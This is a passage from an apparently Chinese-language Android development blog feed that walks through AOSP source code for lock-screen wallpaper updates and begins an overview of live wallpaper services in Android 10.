class="number">0</span>;</span><br><span class="line">    <span class="type">WallpaperData</span> <span class="variable">wallpaper</span> <span class="operator">=</span> dataForEvent(sysWallpaperChanged, lockWallpaperChanged);</span><br><span class="line">    <span class="comment">// 如果是锁屏壁纸更新</span></span><br><span class="line">    <span class="keyword">if</span> (moved &amp;&amp; lockWallpaperChanged) &#123;</span><br><span class="line">        SELinux.restorecon(changedFile);</span><br><span class="line">        notifyLockWallpaperChanged();</span><br><span class="line">        notifyWallpaperColorsChanged(wallpaper, FLAG_LOCK);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sysWallpaperChanged || lockWallpaperChanged) &#123;</span><br><span class="line">            notifyCallbacksLocked(wallpaper);</span><br><span class="line">            <span class="keyword">if</span> (wallpaper.wallpaperComponent == <span class="literal">null</span></span><br><span class="line">                    || event != CLOSE_WRITE <span class="comment">// includes the MOVED_TO case</span></span><br><span class="line">                    || wallpaper.imageWallpaperPending) &#123;</span><br><span class="line">                <span class="keyword">if</span> (written) &#123;</span><br><span class="line">          </span><br><span class="line">                    SELinux.restorecon(changedFile);</span><br><span class="line">                    <span class="keyword">if</span> (moved) &#123;</span><br><span class="line">                        loadSettingsLocked(wallpaper.userId, <span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    generateCrop(wallpaper);</span><br><span class="line">                  </span><br><span class="line">                    wallpaper.imageWallpaperPending = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">if</span> (sysWallpaperChanged) &#123;</span><br><span class="line">                        <span class="comment">// 桌面壁纸变化，那么bind ImageWallpaper，ImageWallpaper是负责显示静态桌面壁纸的</span></span><br><span class="line">                       bindWallpaperComponentLocked(mImageWallpaper, <span class="literal">true</span>,</span><br><span class="line">                                <span class="literal">false</span>, wallpaper, <span class="literal">null</span>);</span><br><span class="line">                        notifyColorsWhich |= FLAG_SYSTEM;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (lockWallpaperChanged</span><br><span class="line">                            || (wallpaper.whichPending &amp; FLAG_LOCK) != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">                            Slog.i(TAG, <span class="string">&quot;Lock-relevant wallpaper changed&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    </span><br><span class="line">                        <span class="keyword">if</span> (!lockWallpaperChanged) &#123;</span><br><span class="line">                            <span class="comment">//如果参数which是system+lock，也就是同时设置锁屏和桌面壁纸，那么remove锁屏壁纸，因为已经是同一张壁纸了</span></span><br><span class="line">                            mLockWallpaperMap.remove(wallpaper.userId);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// and in any case, tell keyguard about it</span></span><br><span class="line">                        notifyLockWallpaperChanged();</span><br><span class="line">                        notifyColorsWhich |= FLAG_LOCK;</span><br><span class="line">                    &#125;</span><br><span class="line">                    saveSettingsLocked(wallpaper.userId);</span><br><span class="line">                    <span class="comment">// Publish completion *after* we&#x27;ve persisted the changes</span></span><br><span class="line">                    <span class="keyword">if</span> (wallpaper.setComplete != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            wallpaper.setComplete.onWallpaperChanged();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                            <span class="comment">// if this fails we don&#x27;t really care; the setting app may just</span></span><br><span class="line">                            <span class="comment">// have crashed and that sort of thing is a fact of life.</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Outside of the lock since it will synchronize itself</span></span><br><span class="line">    <span class="keyword">if</span> (notifyColorsWhich != <span class="number">0</span>) &#123;</span><br><span class="line">        notifyWallpaperColorsChanged(wallpaper, notifyColorsWhich);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看锁屏壁纸更新这一部分 <strong>notifyLockWallpaperChanged()</strong> ：<br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">notifyLockWallpaperChanged</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">IWallpaperManagerCallback</span> <span class="variable">cb</span> <span class="operator">=</span> mKeyguardListener;</span><br><span class="line">    <span class="keyword">if</span> (cb != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cb.onWallpaperChanged();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">// Oh well it went away; no big deal</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">setLockWallpaperCallback</span><span class="params">(IWallpaperManagerCallback cb)</span> &#123;</span><br><span class="line">    checkPermission(android.Manifest.permission.INTERNAL_SYSTEM_WINDOW);</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        mKeyguardListener = cb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>notifyLockWallpaperChanged 中执行 cb.onWallpaperChanged()；这里的 cb = mKeyguardListener，而 mKeyguardListener 在 setLockWallpaperCallback() 方法中得到。 跟进我们发现 cb 其实就是 LockscreenWallpaper 引用，在 <strong>LockscreenWallpaper</strong>  的构造方法里赋值调用：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/LockscreenWallpaper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LockscreenWallpaper</span><span class="params">(WallpaperManager wallpaperManager,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> IWallpaperManager iWallpaperManager,</span></span><br><span class="line"><span class="params">        KeyguardUpdateMonitor keyguardUpdateMonitor,</span></span><br><span class="line"><span class="params">        DumpManager dumpManager,</span></span><br><span class="line"><span class="params">        NotificationMediaManager mediaManager,</span></span><br><span class="line"><span class="params">        <span class="meta">@Main</span> Handler mainHandler)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (iWallpaperManager != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Service is disabled on some devices like Automotive</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// iWallpaperManager 是 WallpaperManagerService 的 binder对象，</span></span><br><span class="line">            <span class="comment">// 通过 dagger 在 SystemServicesModule 实例化。</span></span><br><span class="line">            iWallpaperManager.setLockWallpaperCallback(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;System dead?&quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以当锁屏壁纸更新时，就会回调到 <strong>LockscreenWallpaper#onWallpaperChanged()</strong> ：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/LockscreenWallpaper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onWallpaperChanged</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Called on Binder thread.</span></span><br><span class="line">    postUpdateWallpaper();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postUpdateWallpaper</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mH == <span class="literal">null</span>) &#123;</span><br><span class="line">        Log.wtfStack(TAG, <span class="string">&quot;Trying to use LockscreenWallpaper before initialization.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mH.removeCallbacks(<span class="built_in">this</span>);</span><br><span class="line">    mH.post(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 LockscreenWallpaper 类实现了 Runnable 接口的，所以看下它的 run() 方法； <strong>LockscreenWallpaper#run()</strong> ：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/LockscreenWallpaper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Called in response to onWallpaperChanged on the main thread.</span></span><br><span class="line">    <span class="keyword">if</span> (mLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        mLoader.cancel(<span class="literal">false</span> <span class="comment">/* interrupt */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">currentUser</span> <span class="operator">=</span> mCurrentUserId;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">UserHandle</span> <span class="variable">selectedUser</span> <span class="operator">=</span> mSelectedUser;</span><br><span class="line">    mLoader = <span class="keyword">new</span> <span class="title class_">AsyncTask</span>&lt;Void, Void, LoaderResult&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> LoaderResult <span class="title function_">doInBackground</span><span class="params">(Void... params)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> loadBitmap(currentUser, selectedUser);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPostExecute</span><span class="params">(LoaderResult result)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onPostExecute(result);</span><br><span class="line">            <span class="keyword">if</span> (isCancelled()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result.success) &#123;</span><br><span class="line">                mCached = <span class="literal">true</span>;</span><br><span class="line">                mCache = result.bitmap;</span><br><span class="line">                mUpdateMonitor.setHasLockscreenWallpaper(result.bitmap != <span class="literal">null</span>);</span><br><span class="line">                <span class="comment">// 通知StatusBar更新壁纸</span></span><br><span class="line">                mMediaManager.updateMediaMetaData(</span><br><span class="line">                        <span class="literal">true</span> <span class="comment">/* metaDataChanged */</span>, <span class="literal">true</span> <span class="comment">/* allowEnterAnimation */</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mLoader = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>异步获取壁纸，并通知StatusBar去更新壁纸。<br><strong>NotificationMediaManager#updateMediaMetaData()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/NotificationMediaManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateMediaMetaData</span><span class="params">(<span class="type">boolean</span> metaDataChanged, <span class="type">boolean</span> allowEnterAnimation)</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;StatusBar#updateMediaMetaData&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="type">Bitmap</span> <span class="variable">artworkBitmap</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (mediaMetadata != <span class="literal">null</span> &amp;&amp; !mKeyguardBypassController.getBypassEnabled()) &#123;</span><br><span class="line">        artworkBitmap = mediaMetadata.getBitmap(MediaMetadata.METADATA_KEY_ART);</span><br><span class="line">        <span class="keyword">if</span> (artworkBitmap == <span class="literal">null</span>) &#123;</span><br><span class="line">            artworkBitmap = mediaMetadata.getBitmap(MediaMetadata.METADATA_KEY_ALBUM_ART);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在后台线程上处理图稿并将生成的位图发送到finishUpdateMediaMetaData。</span></span><br><span class="line">    <span class="keyword">if</span> (metaDataChanged) &#123;</span><br><span class="line">        <span class="keyword">for</span> (AsyncTask&lt;?, ?, ?&gt; task : mProcessArtworkTasks) &#123;</span><br><span class="line">            task.cancel(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mProcessArtworkTasks.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (artworkBitmap != <span class="literal">null</span> &amp;&amp; !Utils.useQsMediaPlayer(mContext)) &#123;</span><br><span class="line">        mProcessArtworkTasks.add(<span class="keyword">new</span> <span class="title class_">ProcessArtworkTask</span>(<span class="built_in">this</span>, metaDataChanged,</span><br><span class="line">                allowEnterAnimation).execute(artworkBitmap));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        finishUpdateMediaMetaData(metaDataChanged, allowEnterAnimation, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对锁屏壁纸所在 view 做 setImageBitmap。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/NotificationMediaManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">finishUpdateMediaMetaData</span><span class="params">(<span class="type">boolean</span> metaDataChanged, <span class="type">boolean</span> allowEnterAnimation,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> Bitmap bmp)</span> &#123;</span><br><span class="line">    <span class="type">Drawable</span> <span class="variable">artworkDrawable</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (bmp != <span class="literal">null</span>) &#123;</span><br><span class="line">        artworkDrawable = <span class="keyword">new</span> <span class="title class_">BitmapDrawable</span>(mBackdropBack.getResources(), bmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> ((hasArtwork || DEBUG_MEDIA_FAKE_ARTWORK)</span><br><span class="line">            &amp;&amp; (mStatusBarStateController.getState() != StatusBarState.SHADE || allowWhenShade)</span><br><span class="line">            &amp;&amp;  mBiometricUnlockController != <span class="literal">null</span> &amp;&amp; mBiometricUnlockController.getMode()</span><br><span class="line">                    != BiometricUnlockController.MODE_WAKE_AND_UNLOCK_PULSING</span><br><span class="line">            &amp;&amp; !hideBecauseOccluded) &#123;</span><br><span class="line">         <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">if</span> (metaDataChanged) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mBackdropBack.getDrawable() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Drawable</span> <span class="variable">drawable</span> <span class="operator">=</span></span><br><span class="line">                        mBackdropBack.getDrawable().getConstantState()</span><br><span class="line">                                .newDrawable(mBackdropFront.getResources()).mutate();</span><br><span class="line">                <span class="comment">// 设置壁纸 setImageDrawable()</span></span><br><span class="line">                mBackdropFront.setImageDrawable(drawable);</span><br><span class="line">                mBackdropFront.setAlpha(<span class="number">1f</span>);</span><br><span class="line">                mBackdropFront.setVisibility(View.VISIBLE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mBackdropFront.setVisibility(View.INVISIBLE);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (DEBUG_MEDIA_FAKE_ARTWORK) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0xFF000000</span> | (<span class="type">int</span>)(Math.random() * <span class="number">0xFFFFFF</span>);</span><br><span class="line">                Log.v(TAG, String.format(<span class="string">&quot;DEBUG_MEDIA: setting new color: 0x%08x&quot;</span>, c));</span><br><span class="line">                mBackdropBack.setBackgroundColor(<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">                mBackdropBack.setImageDrawable(<span class="keyword">new</span> <span class="title class_">ColorDrawable</span>(c));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mBackdropBack.setImageDrawable(artworkDrawable);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (mBackdropFront.getVisibility() == View.VISIBLE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (DEBUG_MEDIA) &#123;</span><br><span class="line">                    Log.v(TAG, <span class="string">&quot;DEBUG_MEDIA: Crossfading album artwork from &quot;</span></span><br><span class="line">                            + mBackdropFront.getDrawable()</span><br><span class="line">                            + <span class="string">&quot; to &quot;</span></span><br><span class="line">                            + mBackdropBack.getDrawable());</span><br><span class="line">                &#125;</span><br><span class="line">                mBackdropFront.animate()</span><br><span class="line">                        .setDuration(<span class="number">250</span>)</span><br><span class="line">                        .alpha(<span class="number">0f</span>).withEndAction(mHideBackdropFront);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 mBackdropFront.setImageDrawable(drawable) 方法将图片设置进去，完成锁屏壁纸的更新。<br>mBackdropFront 在 NotificationMediaManager的 <strong>setup()</strong> 方法被赋值，而 setup() 方法在 StatusBar 的 makeStatusBarView() 中被调用初始化。<br><strong>StatusBar#makeStatusBarView()</strong><br><strong>frameworks/layoutlib/bridge/src/com/android/layoutlib/bridge/bars/StatusBar.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">makeStatusBarView</span><span class="params">(<span class="meta">@Nullable</span> RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    mMediaManager.setup(backdrop, backdrop.findViewById(R.id.backdrop_front),</span><br><span class="line">            backdrop.findViewById(R.id.backdrop_back), mScrimController, mLockscreenWallpaper);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Settings </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 动态壁纸 LiveWallpaper</title>
      <link href="/2023/12/31/2023-12-31/"/>
      <url>/2023/12/31/2023-12-31/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 Android 中，壁纸分为动态与静态两种，但其实两者得本质都是一样。都以一个 Service 得形式在后台运行，在一个类型为 TYPE_WALLPAPER 的窗口上绘制内容。也可以这么去理解：静态壁纸是一种特殊的动态壁纸，它仅在窗口上渲染了一张图片，而不会对用户的操作做出反应。动态壁纸不能只应用于锁屏。</p><h4 id="壁纸实现时涉及的几个主要的类："><a href="#壁纸实现时涉及的几个主要的类：" class="headerlink" title="壁纸实现时涉及的几个主要的类："></a>壁纸实现时涉及的几个主要的类：</h4><ul><li><strong>WallpaperService 及其内部类 Engine：</strong> 壁纸在 WallpaperService 这个服务中运⾏，当需要实现⾃⼰的壁纸时，继承和实现这个类，是⾸先需要做的。Engine是WallpaperService中的⼀个内部类，实现了壁纸服务窗⼝的创建以及 Surface 的维护，同时 Engine 内部类还提供了 onVisibilityChanged()，onCommand() 等回调⽅法，⽤于可见状态变化和⽤户触摸事件等。Engine 类因此也是壁纸实现的核⼼类，实现和重写其接⼝在开发中也相当重要。</li><li><strong>WallpaperManagerService 和 WallpaperManager：</strong> WallpaperManagerService ⽤于管理壁纸的运⾏与切换，并通过 WallpaperManager 对外界提供操作壁纸的接⼝。</li><li><strong>WindowMangerService：</strong> 该类⽤于计算壁纸窗⼝的 Z 序，可见性以及为壁纸窗⼝应⽤动画。</li></ul><h4 id="壁纸服务的两种启动场景："><a href="#壁纸服务的两种启动场景：" class="headerlink" title="壁纸服务的两种启动场景："></a>壁纸服务的两种启动场景：</h4><h4 id="1、重启壁纸服务启动流程："><a href="#1、重启壁纸服务启动流程：" class="headerlink" title="1、重启壁纸服务启动流程："></a>1、重启壁纸服务启动流程：</h4><p>SystemService 进程启动时，会启动各种系统服务。在该类的 startOtherServices() ⽅法中会⾸先拉起 WallpaperManagerService，通过该类，WallpaperService 后⾯才得以启动。</p><p><strong>frameworks/base/services/core/java/com/android/server/SystemService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (context.getResources().getBoolean(R.bool.config_enableWallpaperService)) &#123;</span><br><span class="line">    t.traceBegin(<span class="string">&quot;StartWallpaperManagerService&quot;</span>);</span><br><span class="line">    mSystemServiceManager.startService(WALLPAPER_SERVICE_CLASS);</span><br><span class="line">    t.traceEnd();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Slog.i(TAG, <span class="string">&quot;Wallpaper service disabled by config&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WallpaperManagerService 启动之后回调用到 systemReady() ⽅法。</p><p><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Lifecycle</span> <span class="keyword">extends</span> <span class="title class_">SystemService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IWallpaperManagerService mService;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Lifecycle</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBootPhase</span><span class="params">(<span class="type">int</span> phase)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mService != <span class="literal">null</span>) &#123;</span><br><span class="line">            mService.onBootPhase(phase);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUnlockUser</span><span class="params">(<span class="type">int</span> userHandle)</span> &#123;</span><br><span class="line">      <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBootPhase</span><span class="params">(<span class="type">int</span> phase)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (phase == SystemService.PHASE_ACTIVITY_MANAGER_READY) &#123;</span><br><span class="line">        systemReady();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (phase == SystemService.PHASE_THIRD_PARTY_APPS_CAN_START) &#123;</span><br><span class="line">        switchUser(UserHandle.USER_SYSTEM, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">systemReady</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Slog.v(TAG, <span class="string">&quot;systemReady&quot;</span>);</span><br><span class="line">    initialize();</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">        